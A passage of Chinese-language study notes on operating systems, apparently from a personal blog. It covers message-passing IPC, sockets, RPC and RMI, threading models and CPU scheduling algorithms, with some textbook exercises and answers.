原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li> receive(id, message）：接收来自任何进程的消息，变量id设置成与其通信的进程名称。</li></ul><p>对称和非对称寻址方案的<strong>缺点</strong></p><ul><li>是限制了进程定义的模块化。改变进程的名称可能必须检查所有其他进程定义。所有旧名称的引用都必须找到， 以便修改成为新名称。</li><li>有可能造成依赖于特定的操作系统，因为不同操作系统对进程的ID号的指定方式可能不一致；</li><li>每对进程间只能够建立一条链路是一个重大的缺陷。</li></ul><p><strong>间接通信</strong>:</p><p>在<strong>间接通信</strong>中， 通过邮箱或端口来发送和接收消息。邮箱可以抽象成一个对象， 进程可以向其中存放消息，也可从中删除消息，每个邮箱都有一个唯一的标识符。例如，POSIX消息队列采用一个整数值来标识一个邮箱。对于这种方案， 一个进程可能通过许多不同的邮箱与其他进程通信， 但两个进程仅在其共享至少一个邮箱时可相互通信。原语send()和receive()定义如下：</p><ul><li>send(A , message）：发送一个消息到邮箱A。</li><li> receive(A, message）： 接收来自邮箱A 的消息。</li></ul><p>对于这种方案， 通信线路具有如下属性：</p><ul><li>只有在两个进程共享一个邮箱时， 才能建立通信线路。</li><li> 一个线路可以与两个或更多的进程相关联。</li><li>两个通信进程之间可有多个不同的线路， 每个线路对应于一个邮箱。</li></ul></li><li><p><strong>同步</strong></p><p>进程间的通信可以通过调用原语send（）和receiveO来进行。这些原语的实现有不同的设计选项。消息传递可以是阻塞或非阻塞一一一也称为同步或异步。</p><ul><li>阻塞send：发送进程阻塞，直到消息被接收进程或邮箱所接收。</li><li>非阻塞send：发送进程发送消息并再继续操作。</li><li>阻塞receive：接收者阻塞，直到有消息可用。</li><li>非阻塞receive：接收者收到一个有效消息或空消息。</li></ul><p>send（）和receive（）可以进行多种组合。当send（）和receive（）都阻塞时，则在发送者和接收者之间就有一个集合点（rendezvous）。当使用阻塞sendO和receive(）时，如何解决生产者－消费者问题就不再重要了。生产者仅需调用阻塞send（）调用并等待，直到消息被送到接收者或邮箱。同样地，当消费者调用receive（）时，发生阻塞直到有一个消息可用。</p></li><li><p><strong>缓冲</strong></p><p>不管通信是直接的或是间接的， 通信进程所交换的消息都驻留在临时队列中。简单地讲， 队列实现有三种方法：</p><ul><li>零容量：队列的最大长度为0：因此， 线路中不能有任何消息处于等待。对于这种<br>情况， 必须阻塞发送， 直到接收者接收到消息。</li><li>有限容量：队列的长度为有限的n： 因此， 最多只能有n个消息驻留其中。如果在发送新消息时队列未满，那么该消息可以放在队列中（或者复制消息或者保存消息的指针），且发送者可继续执行而不必等待。不过， 线路容量有限。如果线路满， 必须阻塞发送者直到队列中的空间可用为止。</li><li>无限容量：队列长度可以无限，因此， 不管多少消息都可在其中等待， 从不阻塞发送者。</li></ul><p>零容量情况称为没有缓冲的消息系统， 其他情况称为自动缓冲。</p></li></ol><h3 id="3-5-IPC系统的实例"><a href="#3-5-IPC系统的实例" class="headerlink" title="3.5 IPC系统的实例"></a>3.5 IPC系统的实例</h3><h4 id="3-5-1-实例：POSX共享内存"><a href="#3-5-1-实例：POSX共享内存" class="headerlink" title="3.5.1 实例：POSX共享内存"></a>3.5.1 实例：POSX共享内存</h4><h4 id="3-5-2-实例：Mach"><a href="#3-5-2-实例：Mach" class="headerlink" title="3.5.2 实例：Mach"></a>3.5.2 实例：Mach</h4><h4 id="3-5-3-实例：Windows-XP"><a href="#3-5-3-实例：Windows-XP" class="headerlink" title="3.5.3 实例：Windows XP"></a>3.5.3 实例：Windows XP</h4><h3 id="3-6-客户机服务器系统通信"><a href="#3-6-客户机服务器系统通信" class="headerlink" title="3.6 客户机服务器系统通信"></a>3.6 客户机服务器系统通信</h3><h4 id="3-6-1-Socket"><a href="#3-6-1-Socket" class="headerlink" title="3.6.1 Socket"></a>3.6.1 Socket</h4><p><strong>Socket</strong> （套接字〉可定义为通信的端点。一对通过网络通信的进程需要使用一对Socket一一即每个进程各有一个。</p><p>Socket 由IP 地址与一个端口号连接组成。通常， Socket采用客户机一服务器结构。服务器通过监昕指定端口来等待进来的客户请求。一旦收到请求，服务器就接受来自客户Socket 的连接， 从而完成连接。</p><p>Java提供了三种不同类型的Socket。</p><ul><li>面向连接（TCP) Socket是用Socket类实现的。</li><li>无连接（UDP) Socket 使用了DatagramSocket 类。</li><li>最后一种类型是多点传送Socket 类(MulticastSocket class）， 它是DatagramSocket类的子类。多点传送Socket允许数据发送给多个接收者。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114161059376.png" alt="image-20211114161059376"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114161112895.png" alt="image-20211114161112895"></p><p>无论一个Socket通信程序的功能多么齐全、程序多么复杂，其基本结构都是一样的，都包括以下四个基本步骤：</p><ol><li>在客户方和服务器方创建Socket/ServerSocket实例。</li><li>打开连接到Socket的输入/输出流。</li><li>利用输入/输出流，按照一定的协议对Socket进行读/写操作。</li><li>关闭输入/输出流和Socket。//如果网络的一端已经关闭，另一端读到null</li></ol><p>通常，程序员的主要工作是针对所要完成的功能在第3步进行编程，第1、2、4步对所有的通信程序来说几乎都是一样的。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162712864.png" alt="image-20211114162712864"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162726368.png" alt="image-20211114162726368"></p><h4 id="3-6-2-远程过程调用"><a href="#3-6-2-远程过程调用" class="headerlink" title="3.6.2 远程过程调用"></a>3.6.2 远程过程调用</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162954112.png" alt="image-20211114162954112"></p><h4 id="3-6-3-远程方法调用"><a href="#3-6-3-远程方法调用" class="headerlink" title="3.6.3 远程方法调用"></a>3.6.3 远程方法调用</h4><p>远程方法调用（remote method invocation, RMI） 是一个类似于RPC 的Java 特性。RMI允许线程调用远程对象的方法。如果对象位于不同的JVM 上，那么就认为它是远程的。因此， 远程可能在同一计算机或通过网络连接的主机的不同JVM 上。这种情况如图3.22所示。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114163017447.png" alt="image-20211114163017447"></p><h3 id="3-7-小结"><a href="#3-7-小结" class="headerlink" title="3.7 小结"></a>3.7 小结</h3><p>进程是执行中的程序。随着进程的执行， 它改变状态。进程状态由进程当前活动所定义。每个进程可处于： <strong>新的、就绪、运行、等待或终止</strong>等状态。每个进程在操作系统内通过自己的<strong>进程控制块（PCB）</strong>来表示。</p><p>当前不在执行的进程会放在某个等待队列中。操作系统有两种主要队列：<strong>I/O请求队列</strong>和<strong>就绪队列</strong>。就绪队列包括所有准备执行并等待CPU的进程。每个进程都有PCB , PCB链接起来就形成了就绪队列。长期（作业）调度通过选择进程来争用CPU。通常， <strong>长期调度</strong>会受资源分配考虑， 尤其是内存管理的影响。<strong>短期调度</strong>从就绪队列中选择进程。操作系统必须为父进程创建子进程提供一种机制。父进程在继续之前可以等待它的子进程终止， 也可以并发执行父进程和子进程。并发执行有许多优点， 例如信息共享、提高运算速度、模块化和便利性等。</p><p>操作系统的执行进程可以是独立进程或协作进程。协作进程需要进程间有互相通信的机制。主要有两种形式的通信： <strong>共享内存和消息系统</strong>。共享内存方法要求通信进程共享一些变量。进程通过使用这些共享变量来交换信息。对于<strong>共享内存系统</strong>， 主要由应用程序员提供通信， 操作系统只需要提供共享内存。<strong>消息系统方法</strong>允许进程交换信息。提供通信的主要责任在于操作系统本身。这两种方法并不互相排斥， 能在同一操作系统内同时实现。</p><p>客户机一服务器系统中的通信可能使用：</p><p>(1) <strong>Socket</strong>,(2) <strong>远程过程调用(RPC)</strong>,(3) <strong>Java的远程方法调用（RMI）</strong>。</p><p>Socket定义为通信的端点。一对应用程序间的连接由一对Socket组成，每端各有一个通信频道。RPC 是另一种形式的分布式通信。当一个进程（或线程） 调用一个远程应用的方法时， 就出现了RPC。RMI是RPC 的Java版。RMI允许线程如同调用本地对象一样来调用远程对象的方法。RPC 和RMI的主要区别是RPC传递给远程过程的数据是按普通数据结构形式的， 而RMI允许把对象传递给远程方法。</p><h3 id="3-8-习题"><a href="#3-8-习题" class="headerlink" title="3.8 习题"></a>3.8 习题</h3><p><strong>1.什么是多道程序的度（degree of multiprogramming），它的上限由哪些因素确定？</strong></p><blockquote><p>多道即计算机内存中同时存放几道相互独立的程序。多道程序的度就是操作系统将多少个进程放入了内存。上限的限制因素有CPU的核数、所采用的的调度算法、内存的大小等。</p></blockquote><p><strong>3.1 论述长期、中期、短期调度之间的区别。</strong></p><blockquote><p>a.<strong>短期调度</strong>：从准备执行的进程中选择进程， 并为之分配CPU。<br>b.<strong>中期调度</strong>：作为一种中等程度的调度程序，尤其被用于分时系统，一个交换方案的实施，将部分运行程序移出内存，之后，从中断处继续执行。<br>c.<strong>长期调度</strong>（作业调度程序）：通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘）的缓冲池中，保存在那里以便以后执行。长期调度程序从缓冲池中选择进程， 井装入内存以准备执行。</p><p>它们主要的<strong>不同之处</strong>是它们的执行的频率。短期调度必须经常调用一个新进程，由于在系统中，长期调度处理移动的作业时，并不频繁被调用，可能在进程离开系统时才被唤起。</p></blockquote><p><strong>3.2 描述内核在两个进程间进行上下文切换的过程。</strong></p><blockquote><p>进程上下文是由进程的PCB来表示的，它包括CPU寄存器的值和内存管理信息等。</p><p>通常，通过执行一个状态保存（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个状态恢复（ state restore）重新开始运行。</p><p>当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文</p></blockquote><p><strong>3.5 下面设计的好处和坏处分别是什么？系统层次和用户层次都要考虑到</strong>．<br>A，对称和非对称通信</p><p>B，自动和显式缓冲</p><p>C， 复制发送和引用发送</p><p>D，固定大小和可变大小消息</p><h2 id="第4章-线程"><a href="#第4章-线程" class="headerlink" title="第4章 线程"></a>第4章 线程</h2><h3 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h3><p>线程是CPU使用的基本单元， 它由线程由、程序计数器、寄存器集合和技组成。它与属于同一进程的其他线程共享代码段、数据段和其他操作系统资源，如打开文件和信号。一个传统重量级（ heavyweight ）的进程只有单个控制线程。如果进程有多个控制线程， 那么它能同时做多个任务。图4.1 说明了传统单线程进程和多线程进程的差别。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114231912641.png" alt="image-20211114231912641"></p><h4 id="4-1-1-动机"><a href="#4-1-1-动机" class="headerlink" title="4.1.1 动机"></a>4.1.1 动机</h4><h4 id="4-1-2-优点"><a href="#4-1-2-优点" class="headerlink" title="4.1.2 优点"></a>4.1.2 优点</h4><p>多线程编程具有如下4个优点：</p><p>①响应度高： 如果对一个交互程序采用多线程， 那么即使其部分阻塞或执行较冗长的操作，该程序仍能继续执行，从而增加了对用户的响应程度。例如，多线程Web浏览器在用一个线程装入图像时，能通过另一个线程与用户交互。</p><p>②资源共享： 线程默认共享它们所属进程的内存和资源。代码和数据共享的优点是它能允许一个应用程序在同一地址空间有多个不同的活动线程。</p><p>③经济： 进程创建所需要的内存和资源的分配比较昂贵。由于线程能共享它们所属进程的资源，所以创建和切换线程会更为经济。</p><p>④多处理器体系结构的利用： 多钱程的优点之一是能充分使用多处理器体系结构，以便每个进程能井行运行在不同的处理器上。不管有多少CPU， 单线程进程只能运行在一个CPU上。在多CPU上使用多线程加强了并发功能。</p><h3 id="4-2-多线程模型"><a href="#4-2-多线程模型" class="headerlink" title="4.2 多线程模型"></a>4.2 多线程模型</h3><p>有两种不同方法来提供线程支持： 用户层的<strong>用户线程</strong>或内核层的<strong>内核线程</strong>。</p><p>用户线程受内核支持， 而无须内核管理： 而内核线程由操作系统直接支持和管理。</p><h4 id="4-2-1-多对一模型"><a href="#4-2-1-多对一模型" class="headerlink" title="4.2.1 多对一模型"></a>4.2.1 多对一模型</h4><p>多对一模型（见图4.2 ）将许多用户级线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>线程管理是由线程库在用户空间进行的， 因而效率比较高。</li></ul><p><strong>缺点</strong>：</p><ul><li><p>但是如果一个线程执行了阻塞系统调用， 那么整个进程会阻塞。</p></li><li><p>而且， 因为任一时刻只有一个线程能访问内核， 多个线程不能并行运行在多处理器上。</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114232532605.png" alt="image-20211114232532605"></p><h4 id="4-2-2-一对一模型"><a href="#4-2-2-一对一模型" class="headerlink" title="4.2.2 一对一模型"></a>4.2.2 一对一模型</h4><p>一对一模型（见图4.3） 将每个用户线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>该模型在一个线程执行阻塞系统调用时， 能允许另一个线程继续执行， 所以它提供了比多对一模型更好的并发功能；</li><li>它也允许多个线程能并行地运行在多处理器系统上。</li></ul><p>这种模型的唯一<strong>缺点</strong>是：</p><ul><li>每创建一个用户线程就需要创建一个相应的内核线程。由于创建内核线程的开销会影响应用程序的性能， 所以这种模型的绝大多数实现限制了系统所支持的线程数</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114232838467.png" alt="image-20211114232838467"></p><h4 id="4-2-3-多对多模型"><a href="#4-2-3-多对多模型" class="headerlink" title="4.2.3 多对多模型"></a>4.2.3 多对多模型</h4><p>多对多模型（见图4.4） 多路复用了许多用户线程到同样数量或更小数量的内核线程上。内核线程的数量可能与特定应用程序或特定机器有关（位于多处理器上的应用程序可比单处理器上分配更多数量的内核线程）。</p><p>虽然多对一模型允许开发人员创建任意多的用户线程， 但是因为内核只能一次调度一个线程， 所以并没有增加并发性。一对一模型提供了更大的并发性， 但是开发人员必须小心， 不要在应用程序内创建太多的线程（有时可能会限制创建线程的数量）。</p><p>多对多模型没有这两者的缺点：</p><ul><li><p>开发人员可创建任意多的用户线程，并且相应内核线程能在多处理器系统上并发执行。</p></li><li><p>而且，当一个线程执行阻塞系统调用时，内核能调度另一个线程来执行。</p></li></ul><p>一个流行的多对多模型的变种仍然多路复用了许多用户线程到同样数量或更小数量的内核线程上， 但也允许将一个用户线程绑定到某个内核线程上。这个变种有时被称为二级模型（见图4.5）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114233616173.png" alt="image-20211114233616173"></p><h3 id="4-3-线程库"><a href="#4-3-线程库" class="headerlink" title="4.3 线程库"></a>4.3 线程库</h3><p>线程库（也read library）为程序员提供创建和管理线程的API。</p><p>主要有两种方法来实现线程库。</p><ul><li>第一种方法是在用户空间中提供一个没有内核支持的库， 此库的所有代码和数据结构都存在于用户空间中。调用库中的一个函数只是导致了用户空间中的一个本地函数调<br>用， 而不是系统调用。</li><li>第二种方法是执行一个由操作系统直接支持的内核级的库。此时，库的代码和数据结构存在于内核空间中。调用库中的一个API 函数通常会导致对内核的系统调用。</li></ul><h4 id="4-3-1-Pthread"><a href="#4-3-1-Pthread" class="headerlink" title="4.3.1 Pthread"></a>4.3.1 Pthread</h4><h4 id="4-3-2-Win32线程"><a href="#4-3-2-Win32线程" class="headerlink" title="4.3.2 Win32线程"></a>4.3.2 Win32线程</h4><h4 id="4-3-3-Java线程"><a href="#4-3-3-Java线程" class="headerlink" title="4.3.3 Java线程"></a>4.3.3 Java线程</h4><h3 id="4-4-多线程问题"><a href="#4-4-多线程问题" class="headerlink" title="4.4 多线程问题"></a>4.4 多线程问题</h3><h4 id="4-4-1-系统调用fork-和exec"><a href="#4-4-1-系统调用fork-和exec" class="headerlink" title="4.4.1 系统调用fork()和exec()"></a>4.4.1 系统调用fork()和exec()</h4><h4 id="4-4-2-取消"><a href="#4-4-2-取消" class="headerlink" title="4.4.2 取消"></a>4.4.2 取消</h4><h4 id="4-4-3-信号处理"><a href="#4-4-3-信号处理" class="headerlink" title="4.4.3 信号处理"></a>4.4.3 信号处理</h4><h4 id="4-4-4-线程池"><a href="#4-4-4-线程池" class="headerlink" title="4.4.4 线程池"></a>4.4.4 线程池</h4><h4 id="4-4-5-线程特定数据"><a href="#4-4-5-线程特定数据" class="headerlink" title="4.4.5 线程特定数据"></a>4.4.5 线程特定数据</h4><h4 id="4-4-6-调度程序激活"><a href="#4-4-6-调度程序激活" class="headerlink" title="4.4.6 调度程序激活"></a>4.4.6 调度程序激活</h4><h3 id="4-5-操作系统实例"><a href="#4-5-操作系统实例" class="headerlink" title="4.5 操作系统实例"></a>4.5 操作系统实例</h3><h4 id="4-5-1-Windows-XP线程"><a href="#4-5-1-Windows-XP线程" class="headerlink" title="4.5.1 Windows XP线程"></a>4.5.1 Windows XP线程</h4><h4 id="4-5-2-Linux线程"><a href="#4-5-2-Linux线程" class="headerlink" title="4.5.2 Linux线程"></a>4.5.2 Linux线程</h4><h3 id="4-6-小结"><a href="#4-6-小结" class="headerlink" title="4.6 小结"></a>4.6 小结</h3><h3 id="4-7-习题"><a href="#4-7-习题" class="headerlink" title="4.7 习题"></a>4.7 习题</h3><p><strong>4.1 举两个多线程程序设计的例子， 其中多线程的性能比单线程的性能差。</strong></p><p><strong>4.2 描述线程库进行用户级线程上下文切换的过程所采取的措施。</strong></p><p><strong>4.3 在什么环境中， 采用多内核线程的多线程方法比单处理器系统的单线程提供更好的性能？</strong></p><p><strong>4.4 在多线程进程中， 下列哪些程序状态组成被共享？</strong><br><strong>a. 寄存器值</strong><br><strong>b. 堆内存</strong><br><strong>c. 全局变量</strong><br><strong>d. 栈内存</strong></p><blockquote><p>一个线程程序的线程共享<strong>堆内存</strong>和<strong>全局变量</strong>，但每个线程都有属于自己的一组<strong>寄存器值</strong>和<strong>栈内存</strong>。</p></blockquote><p><strong>4.5 使用多用户线程的多线程解决方案，在多处理器系统中可以比在单处理器系统中获得更好的性能吗？</strong></p><p>一个包括多用户线程的多线程系统无法在多处理系统上同时使用不同的处理器。操作系统只能看到一个单一的进程且不会调度在不同处剧器土的不同进程的线程。<br>因此， 多处理器系统执行多个用户线程是没有性能优势的。</p><p><strong>4.6 如4.5.2小节所介绍，Linux并不区分进程和线程，而是将两者同样对待，将一个任务视为进程或线程， 这取决于传递给clone（）系统调用的标志集。然而， 许多操作系统， 如Windows XP和Solaris,对待进程和线程是不一样的。通常， 这类系统使用标记， 其中进程的数据结构中包含指向属于进程的不同线程。试在内核中比较这两种对进程和线程建模的方法。</strong></p><h2 id="第5章-CPU调度"><a href="#第5章-CPU调度" class="headerlink" title="第5章 CPU调度"></a>第5章 CPU调度</h2><h3 id="5-1-基本概念"><a href="#5-1-基本概念" class="headerlink" title="5.1 基本概念"></a>5.1 基本概念</h3><p>多道程序的目标是在任何时候都有某些进程在运行，以使CPU使用率最大化。多道程序的思想较为简单。进程执行直到它必须等待， 通常等待某些I/O请求的完成。</p><p>当一个进程必须等待时， 操作系统会从该进程拿走CPU 的使用权，·而将CPU交给其他进程， 如此继续。在该进程必须等待的时间内，另一个进程就可以拿走CPU的使用权。</p><h4 id="5-1-1-CPU-I-O区间周期"><a href="#5-1-1-CPU-I-O区间周期" class="headerlink" title="5.1.1 CPU-I/O区间周期"></a>5.1.1 CPU-I/O区间周期</h4><p>CPU的成功调度依赖于进程的如下属性：进程执行由CPU执行和I/O等待周期组成。进程在这两个状态之间切换。</p><h4 id="5-1-2-CPU调度程序"><a href="#5-1-2-CPU调度程序" class="headerlink" title="5.1.2 CPU调度程序"></a>5.1.2 CPU调度程序</h4><p>每当CPU空闲时，操作系统就必须从就绪队列中选择一个进程来执行。进程选择由短期调度程序（ short-termscheduler）或CPU调度程序执行。调度程序从内存中选择一个能够执行的进程，并为之分配CPU。</p><h4 id="5-1-3-抢占调度"><a href="#5-1-3-抢占调度" class="headerlink" title="5.1.3 抢占调度"></a>5.1.3 抢占调度</h4><p>CPU调度决策可在如下4种环境下发生：</p><ul><li>当一个进程从运行状态切换到等待状态（例如，I/O请求，或调用wait等待一个子进程的终止〉。</li><li>当一个进程从运行状态切换到就绪状态（例如， 当出现中断时）。</li><li>当一个进程从等待状态切换到就绪状态（例如，νo完成）。</li><li>当一个进程终止时。</li></ul><p>对于第1 和第4 两种情况， 没有选择而只有调度。一个新进程（如果就绪队列中已有一个进程存在〉必须被选择执行。不过， 对于第2 和第3 两种情况， 可以进行选择。</p><p>当调度只能发生在第1 和第4 两种情况下时，称调度方案是<strong>非抢占的</strong>（ nonpreemptive)的或协作的（ cooperative）：否则， 称调度方案是<strong>抢占的</strong>（preemptive）。采用非抢占调度，一旦CPU 分配给一个进程，那么该进程会一直使用CPU 直到进程终止或切换到等待状态。</p><h4 id="5-1-4-分派程序"><a href="#5-1-4-分派程序" class="headerlink" title="5.1.4 分派程序"></a>5.1.4 分派程序</h4><p>分派程序是一个模块，用来将CPU 的控制交给由短期调度程序选择的进程。其功能包括：</p><ul><li>切换上下文。</li><li>切换到用户模式。</li><li>跳转到用户程序的合适位置， 以重新启动程序。</li></ul><p>分派程序应尽可能快， 因为在每次进程切换时都要使用。分派程序停止一个进程而启动另一个所要花的时间称为分派延迟（dispatch latency）。</p><h3 id="5-2-调度准则"><a href="#5-2-调度准则" class="headerlink" title="5.2 调度准则"></a>5.2 调度准则</h3><ul><li><strong>CPU 使用率</strong>： 需要使CPU 尽可能忙。从概念上讲， CPU 使用率从0%～100%。对于真实系统， 它应从40% C轻负荷系统）～90%（重负荷系统）。</li><li><strong>吞吐量</strong>：如果CPU 忙于执行进程，那么就有工作在完成。一种测量工作量的方法称为在吞吐量， 它指一个时间单元内所完成进程的数量。对于长进程，吞吐量可能为每小时一个进程：对于短进程， 吞吐量可能为每秒10 个进程。</li><li><strong>周转时间</strong>：从一个特定进程的角度来看， 一个重要准则是运行该进程需要多长时间。从进程提交到进程完成的时间段称为周转时间。周转时间为所有时间段之和， 包括等待进入内存、在就绪队列中等待、在CPU 上执行和νo执行。</li><li><strong>等待时间</strong>： CPU 调度算法并不影响进程运行和执行I/O的时间： 它只影响进程在就绪队列中等待所花的时间。等待时间为在就绪队列中等待所花费时间之和。</li><li><strong>响应时间</strong>： 对于交互系统， 周转时间并不是最佳准则。通常， 进程能相当早就产生输出， 并继续计算新结果同时输出以前的结果给用户。因此， 另一时间是从提交请求到产生第一响应的时间。这种时间称为响应时间， 是开始响应所需要的时间， 而不是输出响应所需要的时间。周转时间通常受输出设备速度的限制。</li></ul><p>需要使CPU 使用率和吞吐量最大化，而使周转时间、等待时间和响应时间最小化。</p><h3 id="5-3-调度算法"><a href="#5-3-调度算法" class="headerlink" title="5.3 调度算法"></a>5.3 调度算法</h3><h4 id="5-3-1-先到先服务调度（FCFS）"><a href="#5-3-1-先到先服务调度（FCFS）" class="headerlink" title="5.3.1 先到先服务调度（FCFS）"></a>5.3.1 先到先服务调度（FCFS）</h4><p><strong>first-come，first-served</strong></p><p>先请求CPU 的进程先分配到CPU。</p><p>FCFS是非抢占的</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103111439645.png" alt="image-20211103111439645"></p><h4 id="5-3-2-最短作业优先调度-SJF"><a href="#5-3-2-最短作业优先调度-SJF" class="headerlink" title="5.3.2 最短作业优先调度(SJF)"></a>5.3.2 最短作业优先调度(SJF)</h4><p><strong>shortest job-first (SJF) scheduling algorithm</strong> </p><p>这一算法将每个进程与其下一个CPU 区间段相关联。当CPU 为空闲时，它会赋给具有最短CPU 区间的进程。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103112112804.png" alt="image-20211103112112804"></p><p>SJF 调度算法可证明为最佳的， 这是因为对于给定的一组进程， SJF 算法的平均等待时间最小。</p><p>SJF调度经常用于长期调度。</p><p>对于短期调度，一种方法是使用近似SJF调度，虽然不知道下一个CPU区间的长度，但是可以预测它。认为下一个CPU区间的长度与以前的相似。下一个CPU区间通常可预测为以前CPU区间的测量长度的指数平均。</p><p>SJF 算法可能是抢占的或非抢占的。</p><p>抢占SJF 调度有时称为<strong>最短剩余时间优先调度</strong>（shortest-remaining-time-first scheduling）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103113129077.png" alt="image-20211103113129077"></p><h4 id="5-3-3-优先级调度"><a href="#5-3-3-优先级调度" class="headerlink" title="5.3.3 优先级调度"></a>5.3.3 优先级调度</h4><p><strong>priority scheduling algorithm</strong></p><p>每个进程都有一个优先级与其关联，具有最高优先级的进程会分配到CPU。具有相同优先级的进程按FCFS 顺序调度。SJF 算法属于简单优先级算法，其优先级（p） 为下一个（预测的） CPU 区间的倒数。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103113523515.png" alt="image-20211103113523515"></p><p>优先调度可以是<strong>抢占的或者非抢占</strong>的。当一个进程到达就绪队列时， 其优先级与当前运行进程的优先级相比较。如果新到达进程的优先级高于当前运行进程的优先级，那么抢占优先级调度算法会抢占CPU。而非抢占优先级调度算法只是将新进程加到就绪队列的头部。</p><p>优先级调度算法的一个主要问题是<strong>无穷阻塞</strong>（indefinite blocking）或饥饿（ starvation）。可以运行但缺乏CPU 的进程可认为是阻塞的，它在等待CPU。优先级调度算法会使某个低优先级进程无穷等待CPU。</p><p>低优先级进程无穷等待问题的解决之一是<strong>老化</strong>（aging）。老化是一种技术，以逐渐增加在系统中等待很长时间的进程的优先级。</p><h4 id="5-3-4-轮转法调度-RR"><a href="#5-3-4-轮转法调度-RR" class="headerlink" title="5.3.4 轮转法调度(RR)"></a>5.3.4 轮转法调度(RR)</h4><p>轮转法（round-robin, RR） 调度算法是专门为分时系统设计的。它类似于FCFS 调度，但是增加了抢占以切换进程。定义一个较小时间单元称为时间片（ time quantun, or time slice)。时间片通常为10~100ms。将就绪队列作为循环队列。CPU调度程序循环就绪队列为每个进程分配不超过ー个时间片的CPU。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103114645373.png" alt="image-20211103114645373"></p><p>RR算法的性能很大程度上依赖于时间片的大小。在极端情况下，如果时间片非常大，那么RR算法与FCFS算法一样，如果时间片很小(如1ms):那么R算法称为处理器共享。</p><h4 id="5-3-5-多级队列调度"><a href="#5-3-5-多级队列调度" class="headerlink" title="5.3.5 多级队列调度"></a>5.3.5 多级队列调度</h4><p><strong>多级队列调度算法</strong>（multilevel queue scheduling algori也m）将就绪队列分成多个独立队列（见图5.6〕。根据进程的属性， 如内存大小、进程优先级、进程类型， 一个进程被永久地分配到一个队列。每个队列有自己的调度算法。例如， 前台进程和后台进程可处于不同队列。前台队列可能采用RR 算法调度， 而后台队列可能采用FCFS 算法调度。</p><p>另外， 队列之间必须有调度， 通常采用固定优先级抢占调度。例如， 前台队列可以比后台队列具有绝对的优先级。且是抢占式的。</p><p>另一种可能是在队列之间划分时间片。每个队列都有一定的CPU时间，这可用于调度队列内的进程。例如， 对于前台－后台队列的例子， 前台队列可以有80%的CPU时间用于在进程之间进行RR调度， 而后台队列可以有20%的CPU时间采用FCFS算法调度进程。</p><p>优点是低调度开销， 缺点是不够灵活</p><h4 id="5-3-6-多级反馈队列调度"><a href="#5-3-6-多级反馈队列调度" class="headerlink" title="5.3.6 多级反馈队列调度"></a>5.3.6 多级反馈队列调度</h4><p><strong>多级反馈队列调度算法</strong>（multilevelfeedback queue scheduling a lgorithm）允许进程在队列之间移动。主要思想是根据不同CPU区间的特点以区分进程。如果进程使用过多CPU时间， 那么它会被转移到更低优先级队列。这种方案将I/O约束和交互进程留在更高优先级队列。此外， 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列。这种形式的老化阻止饥饿的发生。</p><h3 id="5-4-多处理器调度"><a href="#5-4-多处理器调度" class="headerlink" title="5.4 多处理器调度"></a>5.4 多处理器调度</h3><h4 id="5-4-1-多处理器调度的方法"><a href="#5-4-1-多处理器调度的方法" class="headerlink" title="5.4.1 多处理器调度的方法"></a>5.4.1 多处理器调度的方法</h4><p>一种是种<strong>非对称多处理</strong>（asymmetric multiprocessing）方法。是让一个处理器（主服务器）处理所有的调度决定、I/O处理以及其他系统活动， 其他的处理器只执行用户代码。</p><p>另一种方法是使用<strong>对称多处理</strong>（ symmetric multiprocessing, <strong>SMP</strong>）方法， 即每个处理器自我调度。所有进程可能处于一个共同的就绪队列中， 或每个处理器都有它自己的私有就绪进程队列。无论如何，调度通过每个处理器检查共同就绪队列并选择一个进程来执行。</p><h4 id="5-4-2-处理器亲和性"><a href="#5-4-2-处理器亲和性" class="headerlink" title="5.4.2 处理器亲和性"></a>5.4.2 处理器亲和性</h4><p>处理器亲和性有几种形式。当一个操作系统具有设法让一个进程保持在同一个处理器上运行的策略， 但不能做任何保证时， 则会出现<strong>软亲和性</strong>（ soft affinity ）。 此时， 进程可能<br>在处理器之间移动。有些系统， 如Linux， 